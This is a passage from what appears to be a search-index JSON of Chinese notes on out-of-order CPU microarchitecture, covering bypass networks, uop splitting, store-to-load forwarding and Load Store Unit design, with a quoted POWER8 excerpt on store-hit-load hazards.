\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u53e3\u200b\u66f4\u200b\u591a\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b Issue Queue\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u64cd\u4f5c\u6570\u200b\u4e2a\u6570\u200b\u4e2a\u200b\u8bfb\u53d6\u200b\u53e3\u200b\uff0c\u200b\u4f46\u200b\u597d\u5904\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5c4f\u853d\u6389\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u7684\u200b\u8bfb\u53d6\u200b\u53e3\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6d6e\u70b9\u200b FMA \u200b\u6d41\u6c34\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\u6574\u6570\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002\u200b\u5199\u200b\u548c\u200b\u8bfb\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff1aImplicit Renaming \u200b\u4e2d\u200b\uff0c\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u7684\u200b\u5199\u5165\u200b\u662f\u4ece\u200b ROB \u200b\u4e0a\u200b\u63d0\u4ea4\u200b\uff1b\u200b\u800c\u200b Explicit Renaming \u200b\u5219\u200b\u662f\u200b\u6267\u884c\u200b\u5355\u5143\u200b\u8ba1\u7b97\u200b\u5b8c\u540e\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u3002</li> </ol>"},{"location":"hardware/ooo_cpu.html#_1","title":"\u5e38\u89c1\u200b\u4f18\u5316\u200b\u624b\u6bb5","text":"<p>\u200b\u5728\u200b\u7b2c\u4e00\u200b\u548c\u200b\u7b2c\u4e8c\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u65f6\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b CDB \u200b\u8f6c\u53d1\u200b\u5230\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b\u8fd0\u884c\u200b\u6548\u7387\u200b\u3002\u200b\u5728\u200b\u7b2c\u4e09\u79cd\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u9ad8\u6548\u7387\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff0c\u200b\u4f46\u200b\u56e0\u4e3a\u200b\u4e2d\u95f4\u200b\u591a\u200b\u4e86\u200b\u4e00\u7ea7\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6d41\u6c34\u7ebf\u200b\u7ea7\u200b\uff0c\u200b\u5904\u7406\u200b\u4f1a\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u4e00\u70b9\u200b\u3002\u200b\u6bd4\u5982\u200b\uff0c\u200b\u6709\u200b\u4e00\u6761\u200b ALU \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u786e\u5b9a\u200b\u5b83\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u540e\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u5f97\u5230\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6211\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u628a\u200b\u4f9d\u8d56\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b Dispatch \u200b\u51fa\u53bb\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b ALU \u200b\u4e4b\u95f4\u200b\u8fde\u63a5\u200b\u4e00\u4e2a\u200b bypass \u200b\u7f51\u7edc\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u5468\u671f\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u9ad8\u200b\u541e\u5410\u200b\u7387\u200b\uff0c\u200b\u4e00\u822c\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u88ab\u200b\u8bbe\u8ba1\u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5728\u200b\u5185\u90e8\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u6267\u884c\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u8ba1\u7b97\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u7531\u4e8e\u200b\u6570\u636e\u200b\u4f9d\u8d56\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5e76\u200b\u4e0d\u80fd\u200b\u8fbe\u5230\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6bcf\u4e2a\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u90fd\u200b\u6ee1\u8f7d\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u540e\u200b\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5c31\u4f1a\u52a0\u200b\u4e00\u5c42\u200b\u8f6c\u6362\u200b\uff0c\u200b\u4ece\u200b\u6307\u4ee4\u200b\u8f6c\u6362\u200b\u4e3a\u200b uop\uff0c\u200b\u518d\u200b\u7531\u200b\u540e\u200b\u7aef\u200b\u6267\u884c\u200b\u3002\u200b\u8fd9\u200b\u5728\u200b x86 \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u5f88\u200b\u666e\u904d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6307\u4ee4\u96c6\u200b\u592a\u200b\u590d\u6742\u200b\u4e86\u200b\u3002\u200b\u50cf\u200b AArch64 \u200b\u6307\u4ee4\u96c6\u200b\uff0c\u200b\u5b83\u200b\u5728\u200b Load/Store \u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u4e5f\u200b\u662f\u200b\u62c6\u200b\u5206\u4e3a\u200b\u4e24\u6761\u200b uop \u200b\u6765\u200b\u6267\u884c\u200b\u3002\u200b\u4e00\u4e9b\u200b\u5b9e\u7528\u200b\u7684\u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u6bd4\u5982\u200b <code>D = A ? B : C</code>\uff0c\u200b\u5728\u200b Alpha 21264 \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4e24\u6761\u200b uop\uff0c\u200b\u8fd9\u200b\u4e24\u6761\u200b uop \u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\u5c31\u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u540e\u200b\u7aef\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5426\u5219\u200b\u5728\u200b\u5404\u4e2a\u200b\u5730\u65b9\u200b\u90fd\u200b\u5141\u8bb8\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u6570\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u4e00\u5b9a\u200b\u7684\u200b\u6d6a\u8d39\u200b\u3002</p>"},{"location":"hardware/ooo_cpu.html#_2","title":"\u5185\u5b58\u200b\u8bbf\u95ee","text":"<p>\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5b83\u200b\u6d89\u53ca\u200b\u5230\u200b\u7f13\u5b58\u200b\u3001\u200b\u9875\u8868\u200b\u3001\u200b\u5185\u5b58\u200b\u5e8f\u200b\u7b49\u200b\u95ee\u9898\u200b\u3002\u200b\u5728\u200b\u4e71\u5e8f\u6267\u884c\u200b\u4e2d\u200b\uff0c\u200b\u8981\u200b\u5c3d\u91cf\u200b\u4f18\u5316\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u5bf9\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\u3002\u200b\u8fd9\u91cc\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b BOOM \u200b\u7684\u200b LSU \u200b\u8bbe\u8ba1\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u6b63\u786e\u6027\u200b\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\uff0cLoad \u200b\u662f\u200b\u6ca1\u6709\u200b\u526f\u4f5c\u7528\u200b\u7684\u200b\uff08\u200b\u5b9e\u9645\u4e0a\u200b\uff0cLoad \u200b\u4f1a\u200b\u5bfc\u81f4\u200b Cache \u200b\u52a0\u8f7d\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5f15\u53d1\u200b\u4e86\u200b\u4ee5\u200b Meltdown \u200b\u4e3a\u9996\u200b\u7684\u200b\u4e00\u7cfb\u5217\u200b\u6f0f\u6d1e\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u6fc0\u8fdb\u200b\u5730\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b Load\u3002\u200b\u4f46\u662f\u200b\uff0cStore \u200b\u662f\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\u7684\u200b\uff0c\u200b\u5199\u51fa\u53bb\u200b\u7684\u200b\u6570\u636e\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u8fd8\u539f\u200b\u4e86\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cStore \u200b\u6307\u4ee4\u200b\u53ea\u6709\u200b\u5728\u200b ROB Head \u200b\u88ab\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u5199\u5165\u200b\u5230\u200b Cache \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u5176\u6b21\u200b\u662f\u200b\u6027\u80fd\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b Load \u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u5730\u200b\u5b8c\u6210\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u4f7f\u5f97\u200b\u540e\u7eed\u200b\u7684\u200b\u8ba1\u7b97\u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u5730\u200b\u5f00\u59cb\u200b\u8fdb\u884c\u200b\u3002\u200b\u5f53\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u200b\u597d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53bb\u53d6\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u8981\u200b\u53bb\u200b Store Queue \u200b\u91cc\u9762\u200b\u627e\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b Store \u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u7b49\u4e8e\u200b Load \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8bf4\u660e\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u4f9d\u8d56\u4e8e\u200b\u524d\u9762\u200b\u7684\u200b Store\uff0c\u200b\u5982\u679c\u200b Store \u200b\u7684\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u51c6\u5907\u200b\u597d\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u628a\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u8fc7\u6765\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ece\u200b Cache \u200b\u4e2d\u200b\u83b7\u53d6\u200b\uff0c\u200b\u5982\u679c\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u200b\u51c6\u5907\u200b\u597d\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u7b49\u5f85\u200b\u8fd9\u200b\u4e00\u6761\u200b Store \u200b\u5b8c\u6210\u200b\uff1b\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u53d6\u200b\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u6709\u200b\u4e00\u79cd\u200b\u60c5\u51b5\u200b\u5c31\u662f\u200b\uff0c\u200b\u5f53\u200b Store \u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u8fdf\u8fdf\u200b\u6ca1\u6709\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u800c\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u5df2\u7ecf\u200b\u63d0\u524d\u200b\u4ece\u200b Cache \u200b\u4e2d\u200b\u83b7\u53d6\u6570\u636e\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f53\u200b Store \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u540e\u9762\u200b\u7684\u200b Load \u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u5730\u5740\u200b\u91cd\u5408\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e86\u200b\uff0c\u200b\u5c31\u8981\u200b\u628a\u200b\u8fd9\u6761\u200b Load \u200b\u4ee5\u53ca\u200b\u4f9d\u8d56\u200b\u8fd9\u200b\u6761\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u5176\u4f59\u200b\u6307\u4ee4\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002POWER8 \u200b\u5904\u7406\u5668\u200b\u5fae\u200b\u67b6\u6784\u200b\u8bba\u6587\u200b\u4e2d\u200b\u5bf9\u6b64\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u8868\u8ff0\u200b\uff1a</p> <pre><code>The POWER8 IFU also implements mechanisms to mitigate performance\ndegradation associated with pipeline hazards. A Store-Hit-Load (SHL) is\nan out-of-order pipeline hazard condition, where an older store executes\nafter a younger overlapping load, thus signaling that the load received\nstale data. The POWER8 IFU has logic to detect when this condition\nexists and provide control to avoid the hazard by flushing the load\ninstruction which received stale data (and any following instructions).\nWhen a load is flushed due to detection of a SHL, the fetch address of\nthe load is saved and the load is marked on subsequent fetches allowing\nthe downstream logic to prevent the hazard. When a marked load\ninstruction is observed, the downstream logic introduces an explicit\nregister dependency for the load to ensure that it is issued after the\nstore operation.\n</code></pre>"},{"location":"hardware/ooo_cpu.html#load-store-unit","title":"Load Store Unit","text":"<p>LSU \u200b\u662f\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6267\u884c\u200b\u5355\u5143\u200b\uff0c\u200b\u8d1f\u8d23\u200b Load/Store/Atomic \u200b\u7b49\u200b\u6307\u4ee4\u200b\u7684\u200b\u5b9e\u73b0\u200b\u3002\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b\u6309\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b pipeline \u200b\u4f1a\u200b\u88ab\u200b\u6e05\u7a7a\u200b\uff0cStore/Atomic/Uncached Load \u200b\u8fd9\u7c7b\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\uff08\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b Meltdown \u200b\u7c7b\u200b\u653b\u51fb\u200b\u7684\u8bdd\u200b\uff0cCached Load \u200b\u4e5f\u200b\u6709\u200b\u526f\u4f5c\u7528\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u5ffd\u7565\u200b\u4e86\u200b\uff09\uff0c\u200b\u9700\u8981\u200b\u7b49\u5230\u200b commit \u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u200b\u6267\u884c\u200b\u3002\u200b\u8fd9\u6837\u200b LSU \u200b\u5f88\u200b\u5bb9\u6613\u200b\u6210\u4e3a\u200b\u74f6\u9888\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b\u8ba9\u200b\u8bfb\u5199\u200b\u4e5f\u200b\u4e71\u5e8f\u200b\u8d77\u6765\u200b\uff0c\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u4e71\u5e8f\u200b\uff0c\u200b\u53d7\u5230\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5f71\u54cd\u200b\u548c\u200b Memory Order/Program Order \u200b\u7684\u200b\u8981\u6c42\u200b\u3002\u200b\u4ece\u200b\u6027\u80fd\u200b\u7684\u200b\u89d2\u5ea6\u200b\u4e0a\u200b\u6765\u770b\u200b\uff0c\u200b\u6211\u4eec\u200b\u80af\u5b9a\u200b\u5e0c\u671b\u200b Load \u200b\u53ef\u4ee5\u200b\u5c3d\u5feb\u200b\u6267\u884c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53ef\u80fd\u200b\u6709\u200b\u5f88\u591a\u200b\u6307\u4ee4\u200b\u5728\u200b\u7b49\u5f85\u200b Load \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u6267\u884c\u200b Load\uff0c\u200b\u4f46\u662f\u200b\u600e\u4e48\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\u5462\u200b\uff1f\u200b\u5728\u200b Load \u200b\u66f4\u200b\u65e9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u82e5\u5e72\u4e2a\u200b Store \u200b\u6307\u4ee4\u200b\u5c1a\u672a\u200b\u6267\u884c\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u7b49\u5f85\u200b\u6240\u6709\u200b\u7684\u200b Store \u200b\u6267\u884c\u200b\u5b8c\u6bd5\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u6027\u80fd\u200b\u4e0d\u597d\u200b\uff1b\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u7528\u200b\u5730\u5740\u200b\u6765\u200b\u641c\u7d22\u200b Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u770b\u770b\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u7684\u200b Store \u200b\u548c\u200b Load\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8f6c\u53d1\u200b\u6570\u636e\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ece\u200b Cache \u200b\u83b7\u53d6\u200b\u4e86\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u76f8\u5f53\u4e8e\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b Buffer\uff0c\u200b\u9762\u79ef\u200b\u5927\u200b\uff0c\u200b\u5ef6\u8fdf\u200b\u9ad8\u200b\uff0c\u200b\u4e0d\u597d\u200b\u6269\u5c55\u200b\u7b49\u200b\u95ee\u9898\u200b\u63a5\u8e35\u800c\u81f3\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b Store Queue \u200b\u9700\u8981\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\u7684\u200b\u95ee\u9898\u200b\uff0cA high-bandwidth load-store unit for single-and multi-threaded processors \u200b\u7684\u200b\u89e3\u51b3\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u628a\u200b Store \u200b\u6307\u4ee4\u200b\u5206\u4e3a\u200b\u4e24\u7c7b\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u9700\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u76f8\u8fde\u200b\u5b58\u50a8\u5668\u200b\uff0c\u200b\u53ea\u200b\u4fdd\u5b58\u200b\u8fd9\u4e9b\u200b\u9700\u8981\u200b\u8f6c\u53d1\u200b\u7684\u200b Store \u200b\u6307\u4ee4\u200b\uff1b\u200b\u540c\u65f6\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u5927\u200b\u7684\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u6240\u6709\u200b Store \u200b\u6307\u4ee4\u200b\u7684\u200b\u961f\u5217\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e0d\u200b\u9700\u8981\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002</p> <p>\u200b\u4ed4\u7ec6\u200b\u60f3\u60f3\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1aLoad \u200b\u5728\u200b\u6267\u884c\u200b\u524d\u200b\uff0c\u200b\u66f4\u200b\u65e9\u200b\u7684\u200b Store \u200b\u7684\u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5c31\u7eea\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u53bb\u200b\u641c\u7d22\u200b Store Queue \u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u662f\u200b\u9519\u200b\u7684\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u8981\u4e48\u200b\u7b49\u5f85\u200b\u6240\u6709\u200b\u7684\u200b Store \u200b\u5730\u5740\u200b\u90fd\u200b\u5c31\u7eea\u200b\uff0c\u200b\u8981\u4e48\u200b\u5c31\u200b\u5148\u200b\u6267\u884c\u200b\uff0c\u200b\u518d\u7528\u200b\u4e00\u4e9b\u200b\u673a\u5236\u200b\u6765\u200b\u4fee\u590d\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u663e\u7136\u200b\u540e\u8005\u200b IPC \u200b\u8981\u200b\u66f4\u597d\u200b\u3002</p> <p>\u200b\u4fee\u590d\u200b Load Store \u200b\u6307\u4ee4\u200b\u76f8\u5173\u6027\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5f53\u200b\u4e00\u4e2a\u200b Store \u200b\u63d0\u4ea4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u662f\u5426\u200b\u6709\u200b\u5730\u5740\u200b\u51b2\u7a81\u200b\u7684\u200b Load \u200b\u6307\u4ee4\u200b\uff08\u200b\u90a3\u4e48\u200b Load Queue \u200b\u4e5f\u200b\u8981\u200b\u505a\u6210\u200b\u76f8\u8fde\u200b\u641c\u7d22\u200b\u7684\u200b\uff09\uff0c\u200b\u662f\u5426\u200b\u8f6c\u53d1\u200b\u4e86\u200b\u9519\u8bef\u200b\u7684\u200b Store \u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b Boom LSU \u200b\u91c7\u7528\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u529e\u6cd5\u200b\u662f\u200b Commit \u200b\u7684\u200b\u65f6\u5019\u200b\uff08\u200b\u6216\u8005\u200b\u6309\u200b\u987a\u5e8f\u200b\uff09\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b Load \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b Load \u200b\u7ed3\u679c\u200b\u548c\u200b\u4e4b\u524d\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u540e\u9762\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5237\u65b0\u200b\u6389\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u7684\u200b\u7f3a\u70b9\u200b\u662f\u200b\u6bcf\u6761\u200b Load \u200b\u6307\u4ee4\u200b\u90fd\u200b\u8981\u200b\u81f3\u5c11\u200b\u8bbf\u95ee\u200b\u4e24\u6b21\u200b Cache\u3002Store Vulnerability Window (SVW): Re-Execution Filtering for Enhanced Load Optimization \u200b\u5c5e\u4e8e\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b Load \u200b\u6307\u4ee4\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u901a\u8fc7\u200b Bloom filter \u200b\u6765\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u91cd\u590d\u200b\u6267\u884c\u200b\u7684\u200b Load\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\uff0c\u200b\u5c31\u662f\u200b\u9884\u6d4b\u200b Load \u200b\u6307\u4ee4\u200b\u548c\u200b\u54ea\u4e00\u6761\u200b Store \u200b\u6307\u4ee4\u200b\u6709\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u90a3\u200b\u4e00\u9879\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b\u5339\u914d\u200b\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u6ca1\u6709\u200b\u4f9d\u8d56\u200b\u3002Scalable Store-Load Forwarding via Store Queue Index Prediction \u200b\u628a\u200b Load \u200b\u6307\u4ee4\u200b\u5206\u4e3a\u200b\u4e09\u7c7b\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u4f9d\u8d56\u200b\u54ea\u6761\u200b Store \u200b\u6307\u4ee4\u200b\uff08Difficult Loads\uff09\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u57fa\u672c\u200b\u786e\u5b9a\u200b\u4f9d\u8d56\u200b\u54ea\u4e00\u6761\u200b Store 